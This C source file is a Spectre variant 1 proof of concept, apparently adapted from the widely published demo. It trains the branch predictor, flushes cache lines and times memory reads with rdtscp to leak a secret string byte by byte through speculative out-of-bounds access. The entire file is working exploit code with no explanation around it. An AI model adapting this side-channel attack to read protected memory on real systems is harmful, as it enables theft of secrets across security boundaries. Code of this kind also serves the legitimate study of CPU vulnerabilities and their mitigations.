#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h> /* for rdtscp and clflush */

#define CACHE_SIZE 256
unsigned int spy_size = 16;
uint8_t spy[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t cache_set[CACHE_SIZE * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0; /* To not optimize out victim_function() */
void victim_function(size_t x)
{
    if (x < spy_size)
        temp &= cache_set[spy[x] * 512];
}

#define CACHE_HIT_THRESHOLD 80
/* cache hit if time <= threshold */
/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[CACHE_SIZE];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < CACHE_SIZE; i++)
        results[i] = 0;
    for (tries = 0; tries < 1000; tries++)
    {
        for (i = 0; i < CACHE_SIZE; i++)
            _mm_clflush(&cache_set[i * 512]);
        training_x = tries % spy_size;
        for (j = 5 * 10 - 1; j >= 0; j--)
        {
            _mm_clflush(&spy_size);
            for (volatile int z = 0; z < 100; z++)
            {
            }
            /* Delay (can also mfence) */

            x = ((j % 6) - 1) & ~0xFFFF;                       // if(j % 6 == 0)
            x = (x | (x >> 16));                               //     x = malicious_x;
            x = training_x ^ (x & (malicious_x ^ training_x)); // else
                                                               //     x = training_x;
            victim_function(x);
        }
        /* Time reads. Mixed-up order to prevent stride prediction */
        for (i = 0; i < CACHE_SIZE; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &cache_set[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;                    /* Time memory access */
            time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
            if (time2 <= CACHE_HIT_THRESHOLD &&
                mix_i != spy[training_x])
                results[mix_i]++; /* cache hit -> score +1 for this value */
        }
        /* Locate highest & second-highest results */
        j = k = -1;
        for (i = 0; i < CACHE_SIZE; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
                k = i;
        }
        if (results[j] >= (2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0))
            break; /* Success if best is > 2*runner-up + 5 or 2/0) */
    }
    /* use junk to prevent code from being optimized out */
    results[0] ^= junk;
    value[0] = j;
    score[0] = results[j];
    value[1] = k;
    score[1] = results[k];
}
int main(int argc, const char **argv)
{
    size_t malicious_x = (size_t)(secret - (char *)spy);
    int i, score[2], len = 40;
    uint8_t value[2];
    for (i = 0; i < sizeof(cache_set); i++)
        cache_set[i] = 1; /* write to cache_set to ensure it is memory backed */

    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
        printf("0x%02X='%c' score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        // if (score[1] > 0)
        //     printf("(second best: 0x%02X='%c' score=%d)", value[1], value[1], score[1]);
        printf("\n");
    }
    return (0);
}